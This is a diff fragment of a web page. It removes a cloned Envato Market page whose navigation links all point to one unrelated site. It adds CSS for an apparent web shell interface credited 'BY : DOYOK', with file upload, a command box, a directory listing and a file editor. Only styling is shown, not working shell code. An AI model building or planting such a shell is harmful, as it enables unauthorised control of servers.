-    <style>:root{--color-grey-1000:#191919;--color-grey-1000-mask: rgb(25 25 25 / 0.7);--color-grey-700:#383838;--color-grey-500:#707070;--color-grey-300:#949494;--color-grey-100:#ccc;--color-grey-50:#ececee;--color-grey-25:#f9f9fb;--color-white:#fff;--color-white-mask: rgb(255 255 255 / 0.7);--color-green-1000:#1a4200;--color-green-700:#2e7400;--color-green-500:#51a31d;--color-green-300:#6cc832;--color-green-100:#9cee69;--color-green-25:#eaffdc;--color-blue-1000:#16357b;--color-blue-700:#4f5ce8;--color-blue-500:#7585ff;--color-blue-25:#f0f1ff;--color-veryberry-1000:#77012d;--color-veryberry-700:#b9004b;--color-veryberry-500:#f65286;--color-veryberry-25:#ffecf2;--color-bubblegum-700:#b037a6;--color-bubblegum-100:#e6afe1;--color-bubblegum-25:#feedfc;--color-jaffa-1000:#692400;--color-jaffa-700:#c24100;--color-jaffa-500:#ff6e28;--color-jaffa-25:#fff5ed;--color-yolk-1000:#452d0d;--color-yolk-700:#9e5f00;--color-yolk-500:#c28800;--color-yolk-300:#ffc800;--color-yolk-25:#fefaea;--color-transparent:transparent;--breakpoint-wide:1024px;--breakpoint-extra-wide:1440px;--breakpoint-2k-wide:2560px;--spacing-8x:128px;--spacing-7x:64px;--spacing-6x:40px;--spacing-5x:32px;--spacing-4x:24px;--spacing-3x:16px;--spacing-2x:8px;--spacing-1x:4px;--spacing-none:0;--chunkiness-none:0;--chunkiness-thin:1px;--chunkiness-thick:2px;--roundness-square:0;--roundness-subtle:4px;--roundness-extra-round:16px;--roundness-circle:48px;--shadow-500: 0px 2px 12px 0px rgba(0 0 0 / 15%);--elevation-medium:var(--shadow-500);--transition-base:.2s;--transition-duration-long:500ms;--transition-duration-medium:300ms;--transition-duration-short:150ms;--transition-easing-linear:cubic-bezier(0,0,1,1);--transition-easing-ease-in:cubic-bezier(.42,0,1,1);--transition-easing-ease-in-out:cubic-bezier(.42,0,.58,1);--transition-easing-ease-out:cubic-bezier(0,0,.58,1);--font-family-wide:"PolySansWide" , "PolySans" , "Inter" , -apple-system , "BlinkMacSystemFont" , "Segoe UI" , "Fira Sans" , "Helvetica Neue" , "Arial" , sans-serif;--font-family-regular:"PolySans" , "Inter" , -apple-system , "BlinkMacSystemFont" , "Segoe UI" , "Fira Sans" , "Helvetica Neue" , "Arial" , sans-serif;--font-family-monospace:"Courier New" , monospace;--font-size-10x:6rem;--font-size-9x:4.5rem;--font-size-8x:3rem;--font-size-7x:2.25rem;--font-size-6x:1.875rem;--font-size-5x:1.5rem;--font-size-4x:1.125rem;--font-size-3x:1rem;--font-size-2x:.875rem;--font-size-1x:.75rem;--font-weight-bulky:700;--font-weight-median:600;--font-weight-neutral:400;--font-spacing-tight:-.02em;--font-spacing-normal:0;--font-spacing-loose:.02em;--font-height-tight:1;--font-height-normal:1.5;--icon-size-5x:48px;--icon-size-4x:40px;--icon-size-3x:32px;--icon-size-2x:24px;--icon-size-1x:16px;--icon-size-text-responsive: calc(var(--font-size-3x) * 1.5);--layer-depth-ceiling:9999;--minimum-touch-area:40px;--button-height-large:48px;--button-height-medium:40px;--button-font-family:var(--font-family-regular);--button-font-size-large:var(--font-size-3x);--button-font-size-medium:var(--font-size-2x);--button-font-weight:var(--font-weight-median);--button-font-height:var(--font-height-normal);--button-font-spacing:var(--font-spacing-normal);--text-style-chip-family:var(--font-family-regular);--text-style-chip-spacing:var(--font-spacing-normal);--text-style-chip-xlarge-size:var(--font-size-5x);--text-style-chip-xlarge-weight:var(--font-weight-median);--text-style-chip-xlarge-height:var(--font-height-tight);--text-style-chip-large-size:var(--font-size-3x);--text-style-chip-large-weight:var(--font-weight-neutral);--text-style-chip-large-height:var(--font-height-normal);--text-style-chip-medium-size:var(--font-size-2x);--text-style-chip-medium-weight:var(--font-weight-neutral);--text-style-chip-medium-height:var(--font-height-normal);--text-style-campaign-large-family:var(--font-family-wide);--text-style-campaign-large-size:var(--font-size-9x);--text-style-campaign-large-spacing:var(--font-spacing-normal);--text-style-campaign-large-weight:var(--font-weight-bulky);--text-style-campaign-large-height:var(--font-height-tight);--text-style-campaign-small-family:var(--font-family-wide);--text-style-campaign-small-size:var(--font-size-7x);--text-style-campaign-small-spacing:var(--font-spacing-normal);--text-style-campaign-small-weight:var(--font-weight-bulky);--text-style-campaign-small-height:var(--font-height-tight);--text-style-title-1-family:var(--font-family-regular);--text-style-title-1-size:var(--font-size-8x);--text-style-title-1-spacing:var(--font-spacing-normal);--text-style-title-1-weight:var(--font-weight-bulky);--text-style-title-1-height:var(--font-height-tight);--text-style-title-2-family:var(--font-family-regular);--text-style-title-2-size:var(--font-size-7x);--text-style-title-2-spacing:var(--font-spacing-normal);--text-style-title-2-weight:var(--font-weight-median);--text-style-title-2-height:var(--font-height-tight);--text-style-title-3-family:var(--font-family-regular);--text-style-title-3-size:var(--font-size-6x);--text-style-title-3-spacing:var(--font-spacing-normal);--text-style-title-3-weight:var(--font-weight-median);--text-style-title-3-height:var(--font-height-tight);--text-style-title-4-family:var(--font-family-regular);--text-style-title-4-size:var(--font-size-5x);--text-style-title-4-spacing:var(--font-spacing-normal);--text-style-title-4-weight:var(--font-weight-median);--text-style-title-4-height:var(--font-height-tight);--text-style-subheading-family:var(--font-family-regular);--text-style-subheading-size:var(--font-size-4x);--text-style-subheading-spacing:var(--font-spacing-normal);--text-style-subheading-weight:var(--font-weight-median);--text-style-subheading-height:var(--font-height-normal);--text-style-body-large-family:var(--font-family-regular);--text-style-body-large-size:var(--font-size-3x);--text-style-body-large-spacing:var(--font-spacing-normal);--text-style-body-large-weight:var(--font-weight-neutral);--text-style-body-large-height:var(--font-height-normal);--text-style-body-large-strong-weight:var(--font-weight-bulky);--text-style-body-small-family:var(--font-family-regular);--text-style-body-small-size:var(--font-size-2x);--text-style-body-small-spacing:var(--font-spacing-normal);--text-style-body-small-weight:var(--font-weight-neutral);--text-style-body-small-height:var(--font-height-normal);--text-style-body-small-strong-weight:var(--font-weight-bulky);--text-style-label-large-family:var(--font-family-regular);--text-style-label-large-size:var(--font-size-3x);--text-style-label-large-spacing:var(--font-spacing-normal);--text-style-label-large-weight:var(--font-weight-median);--text-style-label-large-height:var(--font-height-normal);--text-style-label-small-family:var(--font-family-regular);--text-style-label-small-size:var(--font-size-2x);--text-style-label-small-spacing:var(--font-spacing-loose);--text-style-label-small-weight:var(--font-weight-median);--text-style-label-small-height:var(--font-height-normal);--text-style-micro-family:var(--font-family-regular);--text-style-micro-size:var(--font-size-1x);--text-style-micro-spacing:var(--font-spacing-loose);--text-style-micro-weight:var(--font-weight-neutral);--text-style-micro-height:var(--font-height-tight)}.color-scheme-light{--color-interactive-primary:var(--color-green-100);--color-interactive-primary-hover:var(--color-green-300);--color-interactive-secondary:var(--color-transparent);--color-interactive-secondary-hover:var(--color-grey-1000);--color-interactive-tertiary:var(--color-transparent);--color-interactive-tertiary-hover:var(--color-grey-25);--color-interactive-control:var(--color-grey-1000);--color-interactive-control-hover:var(--color-grey-700);--color-interactive-disabled:var(--color-grey-100);--color-surface-primary:var(--color-white);--color-surface-accent:var(--color-grey-50);--color-surface-inverse:var(--color-grey-1000);--color-surface-brand-accent:var(--color-jaffa-25);--color-surface-elevated:var(--color-grey-700);--color-surface-caution-default:var(--color-jaffa-25);--color-surface-caution-strong:var(--color-jaffa-700);--color-surface-critical-default:var(--color-veryberry-25);--color-surface-critical-strong:var(--color-veryberry-700);--color-surface-info-default:var(--color-blue-25);--color-surface-info-strong:var(--color-blue-700);--color-surface-neutral-default:var(--color-grey-25);--color-surface-neutral-strong:var(--color-grey-1000);--color-surface-positive-default:var(--color-green-25);--color-surface-positive-strong:var(--color-green-700);--color-overlay-light:var(--color-white-mask);--color-overlay-dark:var(--color-grey-1000-mask);--color-content-brand:var(--color-green-1000);--color-content-brand-accent:var(--color-bubblegum-700);--color-content-primary:var(--color-grey-1000);--color-content-inverse:var(--color-white);--color-content-secondary:var(--color-grey-500);--color-content-disabled:var(--color-grey-300);--color-content-caution-default:var(--color-jaffa-700);--color-content-caution-strong:var(--color-jaffa-25);--color-content-critical-default:var(--color-veryberry-700);--color-content-critical-strong:var(--color-veryberry-25);--color-content-info-default:var(--color-blue-700);--color-content-info-strong:var(--color-blue-25);--color-content-neutral-default:var(--color-grey-1000);--color-content-neutral-strong:var(--color-white);--color-content-positive-default:var(--color-green-700);--color-content-positive-strong:var(--color-green-25);--color-border-primary:var(--color-grey-1000);--color-border-secondary:var(--color-grey-300);--color-border-tertiary:var(--color-grey-100);--color-always-white:var(--color-white)}.color-scheme-dark{--color-interactive-primary:var(--color-green-100);--color-interactive-primary-hover:var(--color-green-300);--color-interactive-secondary:var(--color-transparent);--color-interactive-secondary-hover:var(--color-white);--color-interactive-tertiary:var(--color-transparent);--color-interactive-tertiary-hover:var(--color-grey-700);--color-interactive-control:var(--color-white);--color-interactive-control-hover:var(--color-grey-100);--color-interactive-disabled:var(--color-grey-700);--color-surface-primary:var(--color-grey-1000);--color-surface-accent:var(--color-grey-700);--color-surface-inverse:var(--color-white);--color-surface-brand-accent:var(--color-grey-700);--color-surface-elevated:var(--color-grey-700);--color-surface-caution-default:var(--color-jaffa-1000);--color-surface-caution-strong:var(--color-jaffa-500);--color-surface-critical-default:var(--color-veryberry-1000);--color-surface-critical-strong:var(--color-veryberry-500);--color-surface-info-default:var(--color-blue-1000);--color-surface-info-strong:var(--color-blue-500);--color-surface-neutral-default:var(--color-grey-700);--color-surface-neutral-strong:var(--color-white);--color-surface-positive-default:var(--color-green-1000);--color-surface-positive-strong:var(--color-green-500);--color-overlay-light:var(--color-white-mask);--color-overlay-dark:var(--color-grey-1000-mask);--color-content-brand:var(--color-green-1000);--color-content-brand-accent:var(--color-bubblegum-100);--color-content-primary:var(--color-white);--color-content-inverse:var(--color-grey-1000);--color-content-secondary:var(--color-grey-100);--color-content-disabled:var(--color-grey-500);--color-content-caution-default:var(--color-jaffa-500);--color-content-caution-strong:var(--color-jaffa-1000);--color-content-critical-default:var(--color-veryberry-500);--color-content-critical-strong:var(--color-veryberry-1000);--color-content-info-default:var(--color-blue-500);--color-content-info-strong:var(--color-blue-1000);--color-content-neutral-default:var(--color-white);--color-content-neutral-strong:var(--color-grey-1000);--color-content-positive-default:var(--color-green-500);--color-content-positive-strong:var(--color-green-1000);--color-border-primary:var(--color-white);--color-border-secondary:var(--color-grey-500);--color-border-tertiary:var(--color-grey-700);--color-always-white:var(--color-white)}</style>
-    <style>.brand-neue-button{gap:var(--spacing-2x);border-radius:var(--roundness-subtle);background:var(--color-interactive-primary);color:var(--color-content-brand);font-family:PolySans-Median;font-size:var(--font-size-2x);letter-spacing:.02em;text-align:center;padding:0 20px}.brand-neue-button:hover,.brand-neue-button:active,.brand-neue-button:focus{background:var(--color-interactive-primary-hover)}.brand-neue-button__open-in-new::after{font-size:0;margin-left:5px;vertical-align:sub;content:url(data:image/svg+xml,<svg\ width=\"14\"\ height=\"14\"\ viewBox=\"0\ 0\ 20\ 20\"\ fill=\"none\"\ xmlns=\"http://www.w3.org/2000/svg\"><g\ id=\"ico-/-24-/-actions-/-open_in_new\"><path\ id=\"Icon-color\"\ d=\"M17.5\ 12.0833V15.8333C17.5\ 16.7538\ 16.7538\ 17.5\ 15.8333\ 17.5H4.16667C3.24619\ 17.5\ 2.5\ 16.7538\ 2.5\ 15.8333V4.16667C2.5\ 3.24619\ 3.24619\ 2.5\ 4.16667\ 2.5H7.91667C8.14679\ 2.5\ 8.33333\ 2.68655\ 8.33333\ 2.91667V3.75C8.33333\ 3.98012\ 8.14679\ 4.16667\ 7.91667\ 4.16667H4.16667V15.8333H15.8333V12.0833C15.8333\ 11.8532\ 16.0199\ 11.6667\ 16.25\ 11.6667H17.0833C17.3135\ 11.6667\ 17.5\ 11.8532\ 17.5\ 12.0833ZM17.3167\ 2.91667L17.0917\ 2.69167C16.98\ 2.57535\ 16.8278\ 2.50668\ 16.6667\ 2.5H11.25C11.0199\ 2.5\ 10.8333\ 2.68655\ 10.8333\ 2.91667V3.75C10.8333\ 3.98012\ 11.0199\ 4.16667\ 11.25\ 4.16667H14.6583L7.625\ 11.2C7.54612\ 11.2782\ 7.50175\ 11.3847\ 7.50175\ 11.4958C7.50175\ 11.6069\ 7.54612\ 11.7134\ 7.625\ 11.7917L8.20833\ 12.375C8.28657\ 12.4539\ 8.39307\ 12.4982\ 8.50417\ 12.4982C8.61527\ 12.4982\ 8.72176\ 12.4539\ 8.8\ 12.375L15.8333\ 5.35V8.75C15.8333\ 8.98012\ 16.0199\ 9.16667\ 16.25\ 9.16667H17.0833C17.3135\ 9.16667\ 17.5\ 8.98012\ 17.5\ 8.75V3.33333C17.4955\ 3.17342\ 17.4299\ 3.02132\ 17.3167\ 2.90833V2.91667Z\"\ fill=\"%231A4200\"/></g></svg>)}</style>
-    <style type="text/css">.fancybox-margin{margin-right:15px}</style>
-    <script src="https://bat.bing.com/p/action/16005611.js" type="text/javascript" async="" data-ueto="ueto_8c931ec7a9"></script>
-        <script src="https://g.lzd-cdn.org/g/mtb/lib-mtop/2.5.1/polyfillB.js,mtb/lib-promise/3.1.3/mtop.js,mtb/lib-modules/1.1.4/pc.js"></script>
-    <meta http-equiv="origin-trial" content="A7JYkbIvWKmS8mWYjXO12SIIsfPdI7twY91Y3LWOV/YbZmN1ZhYv8O+Zs6/IPCfBE99aV9tIC8sWZSCN09vf7gkAAACWeyJvcmlnaW4iOiJodHRwczovL2N0LnBpbnRlcmVzdC5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
-<style>body{background-color:#a844fb;background-image:linear-gradient(315deg,#000000 0%,#2b2b2b 74%);background-attachment:fixed}.site-header,.global-header,.site-header__sites,.site-header__categories{background-color:#a844fb!important;background-image:linear-gradient(315deg,#000000 0%,#000000 74%)!important}.item-preview,.purchase-panel,.box--no-padding{background-color:rgba(24, 24, 24, 0.281)!important;backdrop-filter:blur(12px)!important;-webkit-backdrop-filter:blur(12px)!important;border-radius:16px!important;border:1px solid rgba(255,255,255,.2)!important;box-shadow:0 4px 30px rgba(0,0,0,.1)}.item-preview,.purchase-panel{padding:24px!important;border:none!important}.item-preview__actions{background:transparent!important}.purchase-panel h3,.purchase-panel .price,.purchase-panel p,.purchase-panel label,.purchase-panel a,.purchase-panel .meta-attributes__attr-name,.purchase-panel .meta-attributes__attr-detail{color:#fff!important;text-shadow:1px 1px 3px rgba(0,0,0,.5)}.purchase-panel a{color:#a8eb12!important}</style>
+        .header-text {
+        color: cyan; /* Cyan color for the "BY : DOYOK" text */
+        font-weight: bold; /* Optional: make the text bold */
+        }
+        body {
+            background-color: black;
+            color: #0f0;
+            font-family: monospace;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 90%;
+            max-width: 100%;
+            background: #111;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px #0f0;
+            text-align: left;
+            margin-bottom: 10px;
+        }
+        .path {
+            padding: 10px;
+            background: #222;
+            display: flex;
+            gap: 5px;
+            justify-content: center;
+        }
+        .path a {
+            color: #0f0;
+            text-decoration: none;
+            padding: 3px 6px;
+            background: #333;
+            border-radius: 3px;
+        }
+        .upload-section {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            gap: 10px;
+        }
+        .upload-btn {
+            background: #0f0;
+            color: black;
+            padding: 8px;
+            border: none;
+            cursor: pointer;
+            font-size: 15px;
+            border-radius: 5px;
+        }
+        .command-box {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 95%;
+            gap: 10px;
+            background: #222;
+            border-radius: 5px;
+            padding: 10px;
+        }
+        .command-box input {
+            flex-grow: 1;
+            background: #111;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 8px;
+            font-size: 15px;
+            border-radius: 5px;
+        }
+        .command-box button {
+            background: #0f0;
+            color: black;
+            padding: 8px;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 15px;
+        }
+        .dir-list {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            /* overflow-y: auto; */
+            max-height: 50%;
+        }
+        .dir-list-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            margin-bottom: 5px;
+            background: #333;
+            padding: 5px;
+            border-radius: 3px;
+        }
+        .dir-list-item a {
+            color: #0f0;
+            font-weight: bold;
+            text-decoration: none;
+            flex-grow: 1;
+        }
+        .dir-list-item .file-size {
+            color: #0f0;
+            text-align: center;
+            margin-left: auto;
+            width: 120px;
+            text-align: right;
+            margin-right: 20px;
+        }
+        .dir-list-item button {
+            background: #0f0;
+            color: black;
+            padding: 7px;
+            border: none;
+            cursor: pointer;
+            border-radius: 3px;
+            font-size: 15px;
+        }
+        .dir-list-item .button-container {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        .textarea-container {
+            width: 100%;
+            max-width: 90%;
+            background: #111;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px #0f0;
+            text-align: left;
+            margin-top: 20px;
+        }
+        textarea {
+            width: 100%;
+            height: 300px;
+            background-color: #111;
+            color: #0f0;
+            border: 1px solid #0f0;
+            font-family: monospace;
+            font-size: 15px;
+            padding: 10px;
+        }
+        svg {
+        width: 200px;
+        height: 200px;
+        border: 3px solid black;
+        background-color: black;
+        }
+    </style>
 </head>
-
-<body class="color-scheme-light" data-view="app impressionTracker" data-responsive="true" data-user-signed-in="false" __processed_046ac43c-cdf6-4311-9a75-3ea1775342f5__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZW5hYmxlZCIsIkNPTkZJRyI6ImRpc2FibGVkIn0sInZlcnNpb24iOiIyLjAuMjYiLCJzY29yZSI6MjAwMjYwfV0=">
-    <script src="https://public-assets.envato-static.com/assets/gtm_measurements-40b0a0f82bafab0a0bb77fc35fe1da0650288300b85126c95b4676bcff6e4584.js" nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
-    <noscript>
-        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W8KL5Q5" height="0" width="0" style="display:none;visibility:hidden">
-        </iframe>
-    </noscript>
-
-    <noscript>
-        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KGCDGPL6" height="0" width="0" style="display:none;visibility:hidden">
-        </iframe>
-    </noscript>
-    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
-(function(){function normalizeAttributeValue(value){if(value===undefined||value===null)return undefined
-var normalizedValue
-if(Array.isArray(value)){normalizedValue=normalizedValue||value.map(normalizeAttributeValue).filter(Boolean).join(', ')}normalizedValue=normalizedValue||value.toString().toLowerCase().trim().replace(/&amp;/g,'&').replace(/&#39;/g,"'").replace(/\s+/g,' ')
-if(normalizedValue==='')return undefined
-return normalizedValue}var pageAttributes={app_name:normalizeAttributeValue('Marketplace'),app_env:normalizeAttributeValue('production'),app_version:normalizeAttributeValue('f7d8b3d494288b34cb00105ee5d230d68b0ccca7'),page_type:normalizeAttributeValue('item'),page_location:window.location.href,page_title:document.title,page_referrer:document.referrer,ga_param:normalizeAttributeValue(''),event_attributes:null,user_attributes:{user_id:normalizeAttributeValue(''),market_user_id:normalizeAttributeValue(''),}}
-dataLayer.push(pageAttributes)
-dataLayer.push({event:'analytics_ready',event_attributes:{event_type:'user',custom_timestamp:Date.now()}})})();
-//]]></script>
-    <style>.live-preview-btn--blue .live-preview{background-color:#00857e}.live-preview-btn--blue .live-preview:hover,.live-preview-btn--blue .live-preview:focus{background-color:#0bf}</style>
-
-    <div class="page" bis_skin_checked="1">
-        <div class="page__off-canvas--left overflow" bis_skin_checked="1">
-            <div class="off-canvas-left js-off-canvas-left" bis_skin_checked="1">
-                <div class="off-canvas-left__top" bis_skin_checked="1">
-                    <a href="https://spanishlearningprogram.com/cultural/">Envato Market</a>
-                </div>
-                <div class="off-canvas-left__current-site -color-themeforest" bis_skin_checked="1">
-                    <span class="off-canvas-left__site-title">
-                        Web Themes &amp; Templates
-                    </span>
-                    <a class="off-canvas-left__current-site-toggle -white-arrow -color-themeforest" data-view="dropdown" data-dropdown-target=".off-canvas-left__sites" href="https://spanishlearningprogram.com/cultural/"></a>
-                </div>
-                <div class="off-canvas-left__sites is-hidden" id="off-canvas-sites" bis_skin_checked="1">
-                    <a class="off-canvas-left__site" href="hhttps://spanishlearningprogram.com/cultural/">
-                        <span class="off-canvas-left__site-title">
-                            Code
-                        </span>
-                        <i class="e-icon -icon-right-open"></i>
-                    </a> <a class="off-canvas-left__site" href="https://spanishlearningprogram.com/cultural/">
-                        <span class="off-canvas-left__site-title">
-                            Video
-                        </span>
-                        <i class="e-icon -icon-right-open"></i>
-                    </a> <a class="off-canvas-left__site" href="https://spanishlearningprogram.com/cultural/">
-                        <span class="off-canvas-left__site-title">
-                            Audio
-                        </span>
-                        <i class="e-icon -icon-right-open"></i>
-                    </a> <a class="off-canvas-left__site" href="https://spanishlearningprogram.com/cultural/">
-                        <span class="off-canvas-left__site-title">
-                            Graphics
-                        </span>
-                        <i class="e-icon -icon-right-open"></i>
-                    </a> <a class="off-canvas-left__site" href="https://spanishlearningprogram.com/cultural/">
-                        <span class="off-canvas-left__site-title">
-                            Photos
-                        </span>
-                        <i class="e-icon -icon-right-open"></i>
-                    </a> <a class="off-canvas-left__site" href="https://spanishlearningprogram.com/cultural/">
-                        <span class="off-canvas-left__site-title">
-                            3D Files
-                        </span>
-                        <i class="e-icon -icon-right-open"></i>
-                    </a>
-                </div>
-                <div class="off-canvas-left__search" bis_skin_checked="1">
-                    <form id="search" action="https://spanishlearningprogram.com/cultural/" accept-charset="UTF-8" method="get">
-                        <div class="search-field -border-none" bis_skin_checked="1">
-                            <div class="search-field__input" bis_skin_checked="1">
-                                <input id="term" name="term" type="search" placeholder="Search" class="search-field__input-field">
-                            </div>
-                            <button class="search-field__button" type="submit">
-                                <i class="e-icon -icon-search"><span class="e-icon__alt">Search</span></i>
-                            </button>
-                        </div>
-                    </form>
-                </div>
-                <ul>
-                    <li>
-                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-all-items" href="https://spanishlearningprogram.com/cultural/">
-                            All Items
-                        </a>
-                        <ul class="is-hidden" id="off-canvas-all-items">
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Popular Files</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Featured Files</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Top New Files</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Follow Feed</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Top Authors</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Top New
-                                    Authors</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Public Collections</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">View All Categories</a>
-                            </li>
-                        </ul>
-
-                    </li>
-                    <li>
-                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-wordpress" href="https://spanishlearningprogram.com/cultural/">
-                            WordPress
-                        </a>
-                        <ul class="is-hidden" id="off-canvas-wordpress">
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Show all
-                                    WordPress</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Popular Items</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Blog /
-                                    Magazine</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">BuddyPress</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Corporate</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Creative</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Directory &amp; Listings</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">eCommerce</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Education</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Elementor</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Entertainment</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Mobile</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Nonprofit</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Real
-                                    Estate</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Retail</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Technology</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Wedding</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Miscellaneous</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">WordPress Plugins</a>
-                            </li>
-                        </ul>
-
-                    </li>
-                    <li>
-                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-elementor" href="https://spanishlearningprogram.com/cultural/">
-                            Elementor
-                        </a>
-                        <ul class="is-hidden" id="off-canvas-elementor">
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Template Kits</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Plugins</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Themes</a>
-                            </li>
-                        </ul>
-
-                    </li>
-                    <li>
-
-                        <a class="off-canvas-category-link--empty" href="https://spanishlearningprogram.com/cultural/">
-                            Hosting
-                        </a>
-                    </li>
-                    <li>
-                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-html" href="https://spanishlearningprogram.com/cultural/">
-                            HTML
-                        </a>
-                        <ul class="is-hidden" id="off-canvas-html">
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Show all
-                                    HTML</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Popular Items</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Admin Templates</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Corporate</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Creative</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Entertainment</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Mobile</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Nonprofit</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Personal</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Retail</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Specialty Pages</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Technology</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Wedding</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Miscellaneous</a>
-                            </li>
-                        </ul>
-
-                    </li>
-                    <li>
